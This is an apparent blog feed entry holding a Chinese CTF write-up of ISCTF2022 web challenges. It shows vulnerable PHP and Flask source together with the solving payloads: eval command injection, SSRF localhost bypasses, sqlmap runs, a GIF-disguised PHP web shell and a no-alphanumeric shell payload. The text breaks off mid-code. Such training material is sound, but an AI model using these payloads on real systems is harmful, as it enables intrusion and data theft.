<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ISCTF2022  web  wp</title>
      <link href="/archives/37243.html"/>
      <url>/archives/37243.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108131621248.png"><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108131722374.png"><br>get传参   <strong>?hint</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;web签到&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--给我一个hint，我给你一个hint--&gt;</span><br><span class="line">&lt;!--?hint --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好臭啊&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;什么是POST？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; 什么是GET？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">什么是POST？</span><br></pre></td></tr></table></figure><p>弱类型比较绕过<br>POST:      <strong>ISCTF&#x3D;114514a</strong><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132217092.png"></p><h2 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132307450.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$YOUR_NAME</span> = <span class="variable">$_GET</span>[<span class="string">&quot;NAME&quot;</span>];</span><br><span class="line"><span class="variable">$GET1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET1&quot;</span>];</span><br><span class="line"><span class="variable">$GET2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET2&quot;</span>];</span><br><span class="line"><span class="variable">$POST1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>];</span><br><span class="line"><span class="variable">$POST2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$YOUR_NAME</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,请开始你的答题。&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;做题前请告诉我你是小蓝鲨吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag666</span> = <span class="variable">$f1</span>.<span class="variable">$Ag</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag666</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">做题前请告诉我你是小蓝鲨吗？</span><br></pre></td></tr></table></figure><p>先传入your name进入下一个判断<br>P0ST1不等于P0ST2，但是P0ST1等于P0ST2的md5值,这是md5的弱碰撞<br>GET1过滤了纯数字，用字母绕过，GET2大于678，不能为数字，数组绕过<br>构造payload：<br>GET:    <a href="http://120.79.18.34:20120/?NAME=111&P0ST1=0&P0ST2=s1502113478a">http://120.79.18.34:20120/?NAME=111&P0ST1=0&P0ST2=s1502113478a</a><br>POST:   GET1&#x3D;a&amp;GET2[]&#x3D;690<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132428514.png"><br>前半段是hex解码   ISCTF{0d4c<br>后半段是base64解码，再Unicode解码    6e9a-51a9-45bf-8a6d-513cdf7b530c}</p><h2 id="FakeWeb"><a href="#FakeWeb" class="headerlink" title="FakeWeb"></a>FakeWeb</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132453482.png"><br>burpsuite抓包<br>发现跳转页面<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132644924.png"><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132723459.png"></p><p>经过查阅资料，发现If-None-Match和ETag是解题关键点</p><blockquote><p>当浏览器请求服务器的某项资源(A)时, 服务器根据A算出一个哈希值(3f80f-1b6-3e1cb03b)并通过 ETag 返回给浏览器，浏览器把”3f80f-1b6-3e1cb03b” 和 A 同时缓存在本地，当下次再次向服务器请求A时，会通过类似 If-None-Match: “3f80f-1b6-3e1cb03b” 的请求头把ETag发送给服务器，服务器再次计算A的哈希值并和浏览器返回的值做比较，如果发现A发生了变化就把A返回给浏览器(200)，如果发现A没有变化就给浏览器返回一个304未修改。这样通过控制浏览器端的缓存，可以节省服务器的带宽，因为服务器不需要每次都把全量数据返回给客户端。<br>  聪明的服务器开发者会把ETags和GET请求的“If-None-Match”头一起使用，这样可利用客户端（例如浏览器）的缓存。因为服务器首先产生ETag，服务器可在稍后使用它来判断页面是否已经被修改。本质上，客户端通过将该记号传回服务器要求服务器验证其（客户端）缓存。<br>     其过程如下：<br>     1. 客户端请求一个页面（A）。 服务器返回页面A，并在给A加上一个ETag。 客户端展现该页面，并将页面连同ETag一起缓存。         2. 客户再次请求页面A，并将上次请求时服务器返回的ETag一起传递给服务器。<br>     3. 服务器检查该ETag，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应304（未修改——Not Modified）和一<br>        个空的响应体。</p></blockquote><p>就是说要If-None-Match和ETag的值不相等才会返回一个新的页面，更改If-None-Match的值，然后进行发包<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132821587.png"></p><h2 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132851899.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good try!&quot;</span>;</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come on!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>num不等于36，去空后不等于36，经过过滤后等于36<br>主要就是绕过trim<br>trim过滤了 0a 09 0b 没有过滤0c（换页键）可以试试<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132926394.png"><br><strong>?str&#x3D;\\&#x2F;Ilikeisctf&amp;num&#x3D;%0c36&amp;cmd&#x3D;system(‘ls &#x2F;‘);</strong><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108132956650.png"><br><strong>?str&#x3D;\\&#x2F;Ilikeisctf&amp;num&#x3D;%0c36&amp;cmd&#x3D;system(‘tac &#x2F;flag’);</strong><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133021722.png"></p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133049530.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133133867.png"><br>IP地址伪造，服务端请求伪造，**?urls&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a>   **<br>这个不行，不能绕过，试一下?urls&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p><blockquote><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a> 十六进制<br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a> 八进制 还有一个疑惑就是二进制应该也可以 但是该怎么区分进制呢？<br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a> 10 进制整数格式 (？？)这什么操作<br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a> 16 进制整数格式</p><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a><br>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0000000000000.001/flag.php</a></p><p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p><p>url&#x3D;<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a> CIDR</p><p>以下为常用绕过方式 但本题不行的解法</p><p>短标签绕过<br>ipv6绕过[::1]<br>url&#x3D;<a href="http://0.0.0.127/">http://127</a>。0。0。1&#x2F;flag.php 句号<br><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">参考博客</a></p></blockquote><h2 id="eazy-onlineshell"><a href="#eazy-onlineshell" class="headerlink" title="eazy-onlineshell"></a>eazy-onlineshell</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133204338.png"><br>根据提示先传个rce<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133235116.png"><br>再查看备份文件  </p><p>  <img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133314873.png"><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133354250.png"><br>查看源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/www.zip&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_SourceCode</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:   //访问www.<span class="built_in">zip</span>会打开app.py</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">action_rce</span>():</span><br><span class="line">        <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            action = flask.request.form[<span class="string">&quot;act&quot;</span>]   //在post传入act，写入命令</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(action[<span class="number">1</span>:-<span class="number">1</span>])    //切片，截取第二个和倒数第二个字符之间的</span><br><span class="line">                res = subprocess.run([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">                <span class="comment"># print(res)</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以把文件写入app.py中，找不到其他可以利用的目录文件<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133428124.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133505218.png"></p><p>把ls写入app.py   无回显，所以要访问<a href="http://www.zip执行app.py/">www.zip执行app.py</a><br><strong>act&#x3D;’ls &gt;app.py’</strong><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133533009.png"><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133557738.png"><br>访问flag       act&#x3D;’tac flag&gt;app.py’<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133633611.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133721044.png"></p><h2 id="傻柱"><a href="#傻柱" class="headerlink" title="傻柱"></a>傻柱</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133752018.png"><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133814009.png" alt="image-20221108133814009" style="zoom: 80%;" /><br>猜测是sql注入，但是不知道注入类型，登入login页面看一下<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133853474.png"><br>没发现什么可以利用的东西<br>burp suite扫一下，发现存在User - Agent注入，（需要等一会，一开始会检测不出来）<br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133925568.png"><br>sqlmap一把梭<br>针对User - Agent的值探测SQL注入，需要设置 –level值为3<br><strong>sqlmap -u <strong><a href="http://120.79.18.34:20177///login.php">http://120.79.18.34:20177///login.php</a></strong> –level 3 –dbs</strong><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108133956450.png"><br><strong>sqlmap -u <strong><a href="http://120.79.18.34:20177///login.php"><strong>http://120.79.18.34:20177///login.php</strong></a></strong> –level 3 -D ctf –tables</strong><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134018177.png"><br><strong>sqlmap -u <strong><a href="http://120.79.18.34:20177///login.php"><strong>http://120.79.18.34:20177///login.php</strong></a></strong> –level 3 -D ctf -T user_agents –columns –dump</strong><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134045145.png"></p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134103418.png"><br>存在<a href="http://www.rar文件/">www.rar文件</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134142570.png"></p><p>GIF89a<br><?php eval($_REQUEST['cmd']);?><br><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134223323.png"></p><h2 id="rce？"><a href="#rce？" class="headerlink" title="rce？"></a>rce？</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134247377.png"></p><ul><li>用post把shell传上服务器，在shell里面写好我们想执行的代码</li><li>.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。用. file执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那就可以利用.来执行它</li></ul><p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">p</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">神</a><br><a href="https://blog.csdn.net/m0_51078229/article/details/114366053"></a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://120.79.18.34:20176/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134412546.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?shell=?&gt;&lt;?=`.+/%3F%3F%3F/%3F%3F%3F%3F%3F%3F%3F%3F[%40-[]`%3B?&gt;</span><br></pre></td></tr></table></figure><h2 id="猫和老鼠"><a href="#猫和老鼠" class="headerlink" title="猫和老鼠"></a>猫和老鼠</h2><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221108134436377.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//flag is in flag.php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  //在需要字符串值的地方会自动调用它进行对象的类型转换</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable 